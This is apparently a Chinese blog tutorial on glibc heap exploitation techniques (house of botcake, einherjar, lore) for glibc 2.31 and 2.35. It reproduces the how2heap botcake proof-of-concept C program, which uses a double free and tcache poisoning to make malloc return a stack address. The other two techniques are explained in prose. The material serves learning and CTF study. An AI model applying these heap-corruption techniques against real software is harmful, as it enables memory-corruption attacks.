---
title: 【how2heap】 botcake,einherjar,lore
index_img: img/article/how2heap1/backward_consolidate-1666247169487-3.png
excerpt: 针对glibc2.31及glibc2.35两个版本中的house of botcake, house of einherjar, house of lore三种方式进行讨论，其他版本可以根据特性进行类推，建议先对各种堆块的基本特性和数据结构做已了解之后进行学习。
---

> 本系列将针对glibc2.31及glibc2.35两个版本进行讨论，其他版本可以根据特性进行类推，建议先对各种堆块的基本特性和数据结构做已了解之后进行学习。

## house_of_botcake

house_of_botcake利用的是块的分割，使得只存在uaf漏洞的前提下实现堆块的溢出,达到获取任意地址的目的，下面我们用how2heap中的例子进行理解。

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>


int main()
{
    /*
     * This attack should bypass the restriction introduced in
     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
     * If the libc does not include the restriction, you can simply double free the victim and do a
     * simple tcache poisoning
     * And thanks to @anton00b and @subwire for the weird name of this technique */

    // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    // introduction
    puts("This file demonstrates a powerful tcache poisoning attack by tricking malloc into");
    puts("returning a pointer to an arbitrary location (in this demo, the stack).");
    puts("This attack only relies on double free.\n");

    // prepare the target
    intptr_t stack_var[4];
    puts("The address we want malloc() to return, namely,");
    printf("the target address is %p.\n\n", stack_var);

    // prepare heap layout
    puts("Preparing heap layout");
    puts("Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.");
    intptr_t *x[7];
    for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
        x[i] = malloc(0x100);
    }
    puts("Allocating a chunk for later consolidation");
    intptr_t *prev = malloc(0x100);
    puts("Allocating the victim chunk.");
    intptr_t *a = malloc(0x100);
    printf("malloc(0x100): a=%p.\n", a); 
    puts("Allocating a padding to prevent consolidation.\n");
    malloc(0x10);
    
    // cause chunk overlapping
    puts("Now we are able to cause chunk overlapping");
    puts("Step 1: fill up tcache list");
    for(int i=0; i<7; i++){
        free(x[i]);
    }
    puts("Step 2: free the victim chunk so it will be added to unsorted bin");
    free(a);
    
    puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
    free(prev);
    
    puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
    malloc(0x100);
    /*VULNERABILITY*/
    free(a);// a is already freed
    /*VULNERABILITY*/
    
    // simple tcache poisoning
    puts("Launch tcache poisoning");
    puts("Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk");
    intptr_t *b = malloc(0x120);
    puts("We simply overwrite victim's fwd pointer");
    b[0x120/8-2] = (long)stack_var;
    
    // take target out
    puts("Now we can cash out the target chunk.");
    malloc(0x100);
    intptr_t *c = malloc(0x100);
    printf("The new chunk is at %p\n", c);
    
    // sanity check
    assert(c==stack_var);
    printf("Got control on target/stack!\n\n");
    
    // note
    puts("Note:");
    puts("And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim");
    puts("In that case, once you have done this exploitation, you can have many arbitary writes very easily.");

    return 0;
}
```

首先我们用7个chunk填满tcache

```c
// cause chunk overlapping
puts("Now we are able to cause chunk overlapping");
puts("Step 1: fill up tcache list");
for(int i=0; i<7; i++){
    free(x[i]);
}
```

之后free掉同样大小的prev chunk和a chunk，这时他们会在unsorted bin内合并为一个大chunk

```
puts("Step 2: free the victim chunk so it will be added to unsorted bin");
free(a);

puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
free(prev);
```

先申请一个chunk，然后利用uaf，对 a chunk再次free，让其进入tcache。此时，a chunk同时在tcache和unsorted bin 中。

```
puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
malloc(0x100);
/*VULNERABILITY*/
free(a);// a is already freed
/*VULNERABILITY*/
```

此时如果我们申请一个大一点的chunk，比如0x120，那么就会把prev的指针返回回来，并且可以对a chunk进行溢出，进而更改a chunk的fd，bk等等。



## house_of_einherjar

house of einherjar是一种特殊的堆利用手段，在存在堆溢出可以更改下一个chunk的PREV_INUSE位时，可以利用free的堆块合并，使用这种方式实现任意地址的控制。

![示意图](img/article/how2heap1/backward_consolidate-1666247169487-3.png)

### 溢出前状态

假设溢出前状态如下

![img](img/article/how2heap1/einherjar_before_overflow.png)

### 溢出

这里我们假设 p0 堆块一方面可以写 prev_size 字段，另一方面，存在 off by one 的漏洞，可以写下一个 chunk 的 PREV_INUSE 部分，那么

![img](img/article/how2heap1/einherjar_overflowing.png)

### 溢出后

**假设我们将 p1 的 prev_size 字段设置为我们想要的目的 chunk 位置与 p1 的差值**。在溢出后，我们释放 p1，则我们所得到的新的 chunk 的位置 `chunk_at_offset(p1, -((long) prevsize))` 就是我们想要的 chunk 位置了。

当然，需要注意的是，由于这里会对新的 chunk 进行 unlink ，因此需要确保在对应 chunk 位置构造好了 fake chunk 以便于绕过 unlink 的检测。

![img](img/article/how2heap1/einherjar_after_overflow-1666251341548-11.png)

在这种情况下，我们便可将fake chunk通过再次malloc获得

## house_of_lore

House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。

实际过程就是控制smallbin的最后一个chunk的bk指针，以及fakechunk的fd指针完成双链表的构建既可两次malloc控制任意地址

